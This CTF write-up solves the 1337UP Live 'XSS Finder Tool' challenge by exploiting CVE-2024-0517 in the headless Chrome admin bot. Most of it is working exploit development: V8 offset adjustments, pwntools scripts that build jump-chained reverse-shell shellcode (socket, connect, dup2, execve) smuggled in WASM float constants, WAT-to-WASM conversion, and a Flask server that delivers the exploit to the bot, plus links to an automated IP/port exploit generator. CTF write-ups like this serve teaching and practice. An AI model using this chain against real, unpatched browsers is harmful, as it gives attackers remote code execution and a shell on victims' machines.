---
title: 1337UP Live [XSS Finder Tool]
date: 2024-11-17 08:00:00 +0530
categories: [pwn,browser,CVE-2024-0517,headless chrome,v8]
tags: [CTFtime]
excerpt: XSS Finder Tools is a pwn challenge from 1337 UP live CTF
---

![alt text](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/image.png)

- This challenge had only one solve by [IceCreamMan3333](https://x.com/IceCreamMan3333)

![alt text](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/image-1.png)


## Solution

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241021201333.png)

- After accessing the challenge we are presented with the above UI
- Let's visit the scan page

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241021201346.png)

- We can give some domain for scan, I will give my interact.sh domain for testing

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241021201430.png)

- The page says 'URL is submitted for the scan', so let's check our interact.sh server

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241021201545.png)

- We got hit with a couple of HTTP requests
- These requests has 4 payloads like

```css
/?name=%3Cscript%3Ealert(1)%3C/script%3E
/?id=%3Cscript%3Ealert(1)%3C/script%3E
?uname=%27-prompt(8)-%27
/?msg=%27`%22%3E%3C%3Cscript%3Ejavascript:alert(1)%3C/script%3E
```

- It sent a couple of XSS payloads to our server 
- Let's investigate the user-agent

```js
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/118.0.5989.0 Safari/537.36
```

- It's chrome : 118.0.5989.0
- Let's search CVE's for this version 
- Actually there are multiple CVEs
- Chrome versions < 120.0.6099.224 are vulnerable to this CVE
- https://www.cvedetails.com/cve/CVE-2024-0517/
- I will pick this one
- https://issues.chromium.org/issues/41488920
- Let's try to get RCE using these references

**References:**

- [https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/](https://blog.exodusintel.com/2024/01/19/google-chrome-v8-cve-2024-0517-out-of-bounds-write-code-execution/)
- [https://bnovkebin.github.io/blog/CVE-2024-0517/](https://bnovkebin.github.io/blog/CVE-2024-0517/)
- These two blogs will explain the v8 bug in detail
- I'm referring the second blog by `Minkyun Sung` to recreate this exploit
- He actually explained everything in detail, make sure to check it out


### Setup


- Let's download that particular chrome in our local and try to get RCE in that browser
- we can get old chrome versions from here: https://vikyd.github.io/download-chromium-history-version/#/
- Just choose Linux_x64 and paste the version `118.0.5989.0`
- https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Linux_x64/1191875/
- Here we can download the `chrome-linux.zip`, also we can use the chrome that they provided in the challenge's downloadable file.

**Chrome version info:**

|            |                                                                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------- |
| Chromium   | 118.0.5989.0 (Developer Build) (64-bit)                                                               |
| Revision   | c00be12edcf6fc89d94dfa4496fa6424ccb84b17-refs/heads/main@{#1191875}                                   |
| OS         | Linux                                                                                                 |
| JavaScript | V8 11.8.161                                                                                           |
| User Agent | Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 |

- This chrome version uses this v8 `11.8.161` version, so let's build this particular version of the v8 and setup a debug environment

**v8 debug setup:**

```bash
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
echo "export PATH=$PATH:$(pwd)/depot_tools" >> ~/.zshrc
fetch v8

cd v8
git checkout 11.8.161
gclient sync

sudo apt install ninja-build
./tools/dev/v8gen.py x64.release
ninja -C ./out.gn/x64.release

cd out.gn/x64.release
./d8
```

```js
V8 version 11.8.161
d8>
```

- Now we have successfully compiled the v8 and we are ready to debug
- Make sure to install pwndbg extension in GDB


### Building Exploit

- d8 is a shell for the chrome's v8 engine, it acts like a browser's console and interprets our javascript code

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022195622.png)

- After setting up the pwndbg we can run the d8 binary like this to get an interactive shell to debug
- Since it's a CVE and I haven't implemented any custom patches in the browser's code, you guys can refer the above two blogs for the vulnerability detail
- I'm just using the above blog to build the exploit and I will explain only the payload crafting part in detail

#### Crafting exploit

- I'm using `Minkyun Sung`'s exploit code that he posted in his [github](https://github.com/bnovkebin/bnovkebin.github.io/blob/main/_posts/2024/20240814/exploit.js) 

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022200316.png)

- Running his exploit didn't gave us a shell, because the offset might differ based on the v8 version, but triggering the bug is same
- So let's do some modifications in his exploit to make it work
- first let's calculate the correct offset to `shell_wasm_rwx_addr` -> [line #209](https://github.com/bnovkebin/bnovkebin.github.io/blob/0428cb737871ba3f1fa63b9d9078fdf4fe94a58c/_posts/2024/20240814/exploit.js#L209)
- let's add a console.log there to print `shell_wasm_instance_addr` 's address

```js
console.log(`shellwasm instance address: 0x${shell_wasm_instance_addr.toString(16)}`)
```


![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022201101.png)

```js
shellwasm instance address: 0x19de09
```

- The above address is the wasm instance address without isolate root

```js
let shell_wasm_rwx_addr = v8h_read64(shell_wasm_instance_addr + 0x48n);
```

- In the exploit the **rwx address of the wasm instance** is located **0x48** after the shell_wasm_instance's address
- So first we need to verify whether that **0x48 offset** has exactly the **rwx page address**

```js
d8> %DebugPrint(shell_wasm_instance);
0x38d70019de09 <Instance map = 0x38d70019a3a5>
```

- earlier we got the exact address of the **shell_wasm_instance** using DebugPrint

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022201559.png)

- We can use that address here in pwndb's telescope to print the next set of addresses after that address

```js
0050│  0x38d70019de58 —▸ 0x83a2cb54000 ◂— jmp 0x83a2cb54700
```

- You can see 0x50 has a address value in `red` color, it's a rwx page address
- We can verify that using xinfo
- So the rwx is page is located 0x50 after the `shell_wasm_instance` 

```js
let shell_wasm_rwx_addr = v8h_read64(shell_wasm_instance_addr + 0x50n);
console.log(`shellwasm rwx address: 0x${shell_wasm_rwx_addr.toString(16)}`)
```

- Let's change this offset in the exploit
- Next we need to find our shellcode's address
- For the shellcode part, we can't directly write our shellcode in to the memory and jump there
- We need to convert the hex shellcode to float values and place in in the wasm code to smuggle our shellcode to rwx page
- I'll explain that clearly when we craft our own shell, as of now let's use this existing exceve shellcode


![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022220128.png)

- Start to check the values after the rwx page, and after 0x72e bytes from the shellcode address `0x28ad32b0d000` we can see this movabs instructions

```js
movabs r10,0xbeb909090583b6a
```

- movabs instructions, here is our shellcode placed and the next consecutive 8 byte `0xbeb5b0068732f68` hex values are also our shellcode
- Because it compiled as 8 byte instructions in wasm

```javascript
f64.const flt_point_value_of_the_hex
f64.const flt_point_value_of_the_hex
f64.const flt_point_value_of_the_hex
```

- So it will be moved to a register, so we can jump here and control 8 bytes of instructions
- We can control 8 bytes, so in the first 6 bytes we can give some required instructions to perfrom a operation and the last 2 bytes for the next jump
- In the next jump we do the remaining instructions and jump, jump until we got all our values set in the register

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022220738.png)

- After 2 bytes from the movabs instruction we can access this 8 byte value, so we can jump here.
- As you can see the **jump shellcode chain** to do the execve syscall
- So the shellcode is located in **0x730 bytes** after the shell wasm rwx page, let's change that offset in our exploit

```js
let shell_code_addr = shell_wasm_rwx_addr + 0x730n;
console.log(`shellcode address: 0x${shell_code_addr.toString(16)}`)
```

- For the final part we need to change these values also

```js
let wasmInstance_addr = addrof(wasmInstance);
let RWX_page_pointer = v8h_read64(wasmInstance_addr+0x48n);

let func_make_array = wasmInstance.exports.make_array;

let func_main = wasmInstance.exports.main;
wasm_write(wasmInstance_addr+0x48n, shell_code_addr);
```

- change the offset from 0x48 to 0x50
- After changing these things our exploit will looks like this

[https://gist.github.com/jopraveen/9a355adfce7e771d35c9ccf7e37ddc07](https://gist.github.com/jopraveen/9a355adfce7e771d35c9ccf7e37ddc07)

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241022221513.png)

- nice, thats shellcode is working and we got shell!
- Executing execve with /bin/sh is not enough for this challenge, because we don't get any interactive connections like other pwn challenges.
- The headless chrome that deployed in the server is running internally, so we need to get a reverse shell or we need to exfiltrate the flag that saved in **/tmp/** folder somehow (like doing a curl to our server with the contents of the flag)
- I'm going for rev shell

#### Crafting Reverse shell exploit

- I'm going to use the standard reverse tcp shell from [shellstrom](https://shell-storm.org/shellcode/files/shellcode-857.html)
- For the shellcode part, we can't directly write our shellcode in to the memory and jump there, because as you have seen earlier our wasm code is compiled like `mov reg, <8_BYTE_VALUE>`
- So we are limited to this 8 byte instructions
- Our shellcode will placed 8 byte, 8 byte, 8byte ... in the mov instructions
- **Since we can control 8 bytes**, we can take advantage of the first 6 bytes to write some instruction to do a small part of work, and we can use the last two bytes for jumping in between next mov instruction, so we can reach the another 8 byte shellcode
- By using the above technique we can perform more jumps and finally craft all the required things to get a reverse shell.
- But there is a problem while compiling large wasm code, even our shellcode mov instruction get's optimized, and the jumping length get's varied
- So we need to write a shellcode that handles that jump calculation also

#### syscalls need to perform

- We can get rce using only execve syscall using [this procedure](https://www.turb0.one/pages/Weaponizing_Chrome_CVE-2023-2033_for_RCE_in_Electron:_Some_Assembly_Required.html)
- But here I'm crafting the standard socket reverse shell

| syscalls | syscall_no | rdi                  | rsi                     | rdx                     | r10 |
| -------- | ---------- | -------------------- | ----------------------- | ----------------------- | --- |
| socket   | 0x29       | domain               | type                    | protocol                | -   |
| connect  | 0x2a       | sockfd               | struct sockaddr *       | socklen_t addrlen       | -   |
| dup2     | 0x21       | oldfd                | newfd                   | -                       | -   |
| execve   | 0x3b       | const char *filename | const char *const *argv | const char *const *envp | -   |


- The above things are the required things that we need to get a rev shell using socket connection, also we need to perform a comparison and jmp when doing `dup2` syscall (will explain that while doing)
- Now for crafting our jump shellcode there are already few browser CTF writeups python script, let's use one of them now
- I'm using the python script from [this blog](https://www.turb0.one/pages/Weaponizing_Chrome_CVE-2023-2033_for_RCE_in_Electron:_Some_Assembly_Required.html)
- Let's try to write [this shellcode](https://shell-storm.org/shellcode/files/shellcode-857.html) using the above python script

```python
from pwn import *


context(arch='amd64')
jmp = b'\xeb\x0c'

global current_byte
current_byte = 0x90
global read_bytes
read_bytes = 0
def junk_byte():
    global current_byte
    global read_bytes
    current_byte = (current_byte + read_bytes + 0x17) & 0xFF
    read_bytes += 1
    return current_byte.to_bytes(1,byteorder="big")
global made
made = 0

def make_double(code):
    assert len(code) <= 6
    global made
    tojmp = 0xc
    # tojmp = 0x12
    if made > 14:
        tojmp += 3
    jmp = b'\xeb'
    tojmp += 6-len(code)
    made = made+1
    jmp += tojmp.to_bytes(1, byteorder='big')
    print("0x"+hex(u64((code+jmp).ljust(8, junk_byte())))[2:].rjust(16,'0').upper()+"n,")
```

#### socket syscall

```python
make_double(asm('xor rax,rax'))
make_double(asm('xor rdi,rdi'))
make_double(asm('xor rsi,rsi'))
make_double(asm('xor rdx,rdx'))
make_double(asm('xor r8,r8'))
make_double(asm('push 0x2'))
make_double(asm('pop rdi'))
make_double(asm('push 0x1'))
make_double(asm('pop rsi'))
make_double(asm('push 0x6'))
make_double(asm('pop rdx'))
make_double(asm('push 0x29'))
make_double(asm('pop rax; syscall'))
```

- first let's check whether this syscall works correctly

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023223625.png)

- Now we need to convert all these values to floating point values and make a wat code

```js
var bs = new ArrayBuffer(8);
var fs = new Float64Array(bs);
var is = new BigUint64Array(bs);

function ftoi(val) {
  fs[0] = val;
  return is[0];
}

function itof(val) {
  is[0] = val;
  return fs[0];
}

const gen = () => {
  return [
0xA7A7A70FEBC03148n,
0xBFBFBF0FEBFF3148n,
0xD8D8D80FEBF63148n,
0xF2F2F20FEBD23148n,
0x0D0D0D0FEBC0314Dn,
0x2929292910EB026An,
0x464646464611EB5Fn,
0x6464646410EB016An,
0x838383838311EB5En,
0xA3A3A3A310EB066An,
0xC4C4C4C4C411EB5An,
0xE6E6E6E610EB296An,
0x0909090FEB050F58n,
  ];
};

var arr = gen();
console.log(`WAT code ${arr.length}: \n`)
for (let i=0; i < arr.length; i++){
  console.log("f64.const ",itof(arr[i])+"");
}
for (let i=0; i < arr.length-1; i++){
  console.log("drop");
}
```

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023224037.png)

- Now we need to conver this wat code to wasm and add that wasm code in our javascript exploit.
- Use this [tool](https://github.com/WebAssembly/wabt/releases/download/1.0.36/wabt-1.0.36-ubuntu-20.04.tar.gz) and use `wat2wasm` binary to convert this code to web assembly

```python
import os

let_wat_code = '''
(module
  (func (export "main") (result f64)
f64.const  -1.1724392442428853e-117
f64.const  -0.12400912772790662
f64.const  -1.0023968399475393e+120
f64.const  -5.174445551559503e+245
f64.const  8.309884721501063e-246
f64.const  2.0924531835600378e-110
f64.const  3.5295369634097827e+30
f64.const  4.034879290548565e+175
f64.const  -9.77719779008621e-292
f64.const  -5.277350363223755e-137
f64.const  -1.9615413994613874e+23
f64.const  -4.9824131924791864e+187
f64.const  3.8821145718632853e-265
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
))
'''

open('exp.wat','w').write(let_wat_code)
os.system('./wat2wasm exp.wat')
wasm_bytes = open('exp.wasm','rb').read()
print('let shell_wasm_code = new Uint8Array([',end=' ')
for byte in wasm_bytes:
	print(byte,end=', ')
print('])')
```

- The above python code converts it for us and give use the js code

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023224523.png)

- Comment the previous `shell_wasm_code` and use this

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023224715.png)

- Let's run GDB and check the shellcode is working properly

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023224753.png)

- Looks like our shellcode is not there in the address we calculated previously

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023225054.png)

- Yeh it's placed 0x13 bytes before from our previously calculated address, so let's change the shellcode's offset in our exploit
- now re-run the exploit and set a breakpoint in our shellcode address

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023225435.png)

- The exploit hits our breakpoint, now just step through the instructions and check are there any issues while jumping and placing the required values in the registers
- It executed the `xor rax,rax` correctly but, the it jumped to another unwanted instruction next
- Also we have another problem next

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023230330.png)

- We can see the difference between the first box and the second box
- Our first few set of shellcode (8 set of 8 bytes) has `vmovq  xmm1,r10` instruction in between it, so we can calculate the jump according to that instruction's size, but after 8 sets, there's another instruction coming after **vmovq** , `vmovsd QWORD PTR [rbp-0x28],xmm0`
- So in this case we need to add jumps according to this instruction's size
- So it's a problem if we have to work with a large shellcode :(

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023230659.png)

- After few analysis I came to a conclusion that the next set after the `vmovq  xmm7,r10` instructions follow the same pattern
- So the in between instruction's size won't change in that pattern, so let's add some random floating point junk values in the first 8 sets of shellcode, then let's add our own shellcode and jump directly after the 8th set

```python
import os

let_wat_code = '''
(module
  (func (export "main") (result f64)

;; random values to skip the first 8 sets
f64.const  -1.1434324392442428853e-117
f64.const  -5.4434324392442428853e-127
f64.const  -11.1434124392442428853e-137
f64.const  -13.14364224392442428853e-417
f64.const  -8.1434324392442428853e-217
f64.const  -9.14343124392442428853e-917
f64.const  -4.1434324392442428853e-147
f64.const  -3.1434324392442428853e-207

f64.const  -1.1724392442428853e-117
f64.const  -0.12400912772790662
f64.const  -1.0023968399475393e+120
f64.const  -5.174445551559503e+245
f64.const  8.309884721501063e-246
f64.const  2.0924531835600378e-110
f64.const  3.5295369634097827e+30
f64.const  4.034879290548565e+175
f64.const  -9.77719779008621e-292
f64.const  -5.277350363223755e-137
f64.const  -1.9615413994613874e+23
f64.const  -4.9824131924791864e+187
f64.const  3.8821145718632853e-265
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
drop
))
'''

open('exp.wat','w').write(let_wat_code)
os.system('./wat2wasm exp.wat')
wasm_bytes = open('exp.wasm','rb').read()
print('let shell_wasm_code = new Uint8Array([',end=' ')
for byte in wasm_bytes:
	print(byte,end=', ')
print('])')
```

- Here is the corresponding wat code for it, now add the output of this script to the javscript exploit 


![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023231846.png)

- We skipped 8 sets, so our shellcode's address might changed, let's change it back to the correct offset (0x78e)

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023232150.png)

- We corrected the offset and everything went fine until the syscall instruction

```js
dec    dword ptr [rcx - 0x46]
```

- Here they are expecting a pointer value in rcx, **but RCX is 0**
- So let's add some value, ex: r12 to rcx; now it will pass to the next instruction and we can execute syscall

```python
make_double(asm('xor rax,rax'))
make_double(asm('xor rdi,rdi'))
make_double(asm('xor rsi,rsi'))
make_double(asm('xor rdx,rdx'))
make_double(asm('xor r8,r8'))
make_double(asm('push 0x2'))
make_double(asm('pop rdi'))
make_double(asm('push 0x1'))
make_double(asm('pop rsi'))
make_double(asm('push 0x6'))
make_double(asm('pop rdx; push 0x29'))
make_double(asm(' mov rcx,r12'))
make_double(asm('pop rax; syscall'))
```

- So our `gen_shellcode.py` will looks like this
- After getting the hex output, change to float, then give it to wat code, then convert it to wasm (steps already mentioned above)

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023232853.png)

- Great we made our first syscall working
- Now let's work on the other syscalls


#### connect syscall

```python
make_double(asm(' mov r8,rax'))
make_double(asm(' xor rsi,rsi'))
make_double(asm(' xor r10,r10'))
make_double(asm(' push r10'))
make_double(asm("mov BYTE PTR [rsp],0x2"))
```

- append these things to the `gen_shellcode.py` , now let's craft the IP and port

```
mov    WORD PTR [rsp+0x2],0x697a
mov    DWORD PTR [rsp+0x4],0x435330a
```

- We can't move values like this in the shell-strom's shellcode
- We need to minimize this and make the move byte by byte into the struct and finally point the rsi to rsp


```python
## port crafting
make_double(asm("mov BYTE PTR [rsp+0x1],0x0"))
make_double(asm("mov BYTE PTR [rsp+0x2], 0x01"))
make_double(asm("mov BYTE PTR [rsp+0x3], 0xbb"))
```

- I'm using port 443, it's `0x01bb` be in hexadecimal
- So first let's move `0x0`, `0x01` & `0xbb` into the rsp

```python
## IP crafting
make_double(asm("mov BYTE PTR [rsp+0x4], 0x7f"))
make_double(asm("mov BYTE PTR [rsp+0x5], 0x00"))
make_double(asm("mov BYTE PTR [rsp+0x6], 0x00"))
make_double(asm("mov BYTE PTR [rsp+0x7], 0x01"))
```

- For now I'm using the ip `127.0.0.1` to get a sample shell, it's hexadecimal value is `0x7f000001`, so I'm moving that value byte by byte into the rsp

```python
## remaining connect
make_double(asm('mov rsi,rsp'))
make_double(asm('push 0x10'))
make_double(asm('pop rdx'))
make_double(asm('push r8'))
make_double(asm('pop rdi'))
make_double(asm('push 0x2a'))
make_double(asm('pop rax'))
make_double(asm('syscall'))
```

- You know the drill, convert it to hex, float, wat & wasm

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241023235624.png)

- This shellcode worked perfectly, and we got a socket connection to our netcat
- Now let's do the remaining `dup2` & `execve` syscalls

#### dup2 syscall

```python
make_double(asm('xor rsi,rsi'))
make_double(asm('push 0x3'))
make_double(asm('pop rsi'))
make_double(asm('dec rsi'))
make_double(asm('push 0x21'))
make_double(asm('pop rax'))
make_double(asm('syscall'))
```

- We can do this dup2 syscall, but

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024000043.png)

- We need to implement this jne functionality in our 6 byte restricted shellcode
- In python pwntools, we can't write shellcode like this `jne` , we need to go in reverse

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024000343.png)

- So we need to use a actual byte from a `jne` instruction and add it in our shellcode
- Now it looks like `0x9090909090909f75`

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024000919.png)

- This is for testing `jne` let's put this and generate a sample and adjust the jne according to it (make sure to turn your netcat listener again, else connect syscall will fail)

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024003730.png)


- After the `dup2` syscall `jne` has `0x11543eed6aa6` value to jump next
- we need to jump exactly in the starting of `dec rsi` instruction

```js
0x11543eed6aa9    dec    rsi
```

- `dec rsi` is in `0x11543eed6aa9`

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024003915.png)

- So in this case let's add 3 to the current jne address

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024004052.png)

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024004312.png)

- Now it exactly pointing the `dec rsi` instruction

- We can do this above math easily like this

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024004619.png)

- I'm using **a2** in disasm() because the jump instruction takes 2 bytesm, we need to add that also, Hope it makes sense

```js
>>> disasm(b'\xeb\x0f')
'   0:   eb 0f                   jmp    0x11'
```

- After this instruction we need to jmp 0x11 bytes to reach the next shellcode set, so add this to the existing hex value

```python
print("0x0feb90909090a275n,")
```

```python
## dup2 syscall & jmp handling
make_double(asm('xor rsi,rsi'))
make_double(asm('push 0x3'))
make_double(asm('pop rsi'))
make_double(asm('dec rsi'))
make_double(asm('push 0x21'))
make_double(asm('pop rax'))
make_double(asm('syscall'))

# print("0x9090909090909f75n") # for jmping
print("0x0feb90909090a275n,") # for jmping (correct)
```

#### execve syscall

```python
## exceve syscall
make_double(asm('xor rdi,rdi'))
make_double(asm('push rdi'))
make_double(asm('push rdi'))
make_double(asm('pop rsi'))
make_double(asm('pop rdx'))

# execve single byte chain
make_double(asm("push 0x1337"))
make_double(asm("pop rdi; push rdi"))
make_double(asm("mov rdi, rsp;"))
make_double(asm("mov BYTE PTR [rdi], 0x2f"))
make_double(asm("mov BYTE PTR [rdi+0x1], 0x62"))
make_double(asm("mov BYTE PTR [rdi+0x2], 0x69"))
make_double(asm("mov BYTE PTR [rdi+0x3], 0x6e"))
make_double(asm("mov BYTE PTR [rdi+0x4], 0x2f"))
make_double(asm("mov BYTE PTR [rdi+0x5], 0x73"))
make_double(asm("mov BYTE PTR [rdi+0x6], 0x68"))
make_double(asm("mov BYTE PTR [rdi+0x7], 0x00"))

make_double(asm('push 0x3b'))
make_double(asm('pop rax'))
make_double(asm('syscall'))
```

- I modified this execve syscall part also, because we need to move byte by byte due to 6 byte restriction
- Fingers crossed, let's test this exploit

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024010637.png)

- After hours of debugging we finally got a shell

**Files used:**

- [gen_shellcode.py](https://gist.github.com/jopraveen/6f49466fdc38af6161cd2de3ce1ac586)
- [hex_to_fl.js](https://gist.github.com/jopraveen/ce5adea891f1b1149a19eb7300ccfd7c)
- [convertt.py](https://gist.github.com/jopraveen/b3a55a7a3c81b89e04b70b447f71c0a8)
- [rev_shell_localhost.js](https://gist.github.com/jopraveen/08a70e6015af4ccaa2cbcdadca1cf307)

- I also automated this process of exploit development, so you guys can give only IP and port, it will automatically generate the javascript exploit for you

![](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/Pasted%20image%2020241024013903.png)

- [auto_pwn.py](https://gist.github.com/jopraveen/792decf87421d9c4dafebf66be348b4f)
- Just update the above code in the javascript exploit, everything will work perfectly!!


#### Testing the exploit in the challenge server

```js
127.0.0.1 - - [24/Oct/2024 02:59:51] "GET /?uname='-prompt(8)-' HTTP/1.1" 200 -
127.0.0.1 - - [24/Oct/2024 02:59:51] "GET /?msg='`"><<script>javascript:alert(1)</script> HTTP/1.1" 200 -
127.0.0.1 - - [24/Oct/2024 02:59:51] "GET /?id=<script>alert(1)</script> HTTP/1.1" 200 -
127.0.0.1 - - [24/Oct/2024 02:59:51] "GET /?name=<script>alert(1)</script> HTTP/1.1" 200
```

- The server sends requests like this, so we need to create a small flask app to send a html file for all endpoints

```python
from flask import *

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def send_exp(path):
    return render_template('exp.html')

app.run(host="0.0.0.0")
```

- Run this server server, make sure to add your javascript exploit in `exp.html`
- to demonstrate this exploit I have added my cloud IP for getting reverse shell, you can use your ngrok tcp IP if you don't have any cloud
- Also for hosting the HTML file you can either use ngrok or https://serveo.net/ or any other alts


![alt text](https://raw.githubusercontent.com/jopraveen/jopraveen/refs/heads/main/imgs/image-2.png)

- And we got a shell back, the flag is located in `/tmp` , we can read it :)

Flag: `INTIGRITI{t00_l4zy_t0_g3t_XSS?_then_f1nD_rc3_iN_th3_4Dm1N_b0t_us1nG_uR_chr0m3_0day}`

![catgif](https://raw.githubusercontent.com/jopraveen/jopraveen/main/some-gifs/cat-cute.gif)

- Hope you enjoyed the CTF, thanks for reading
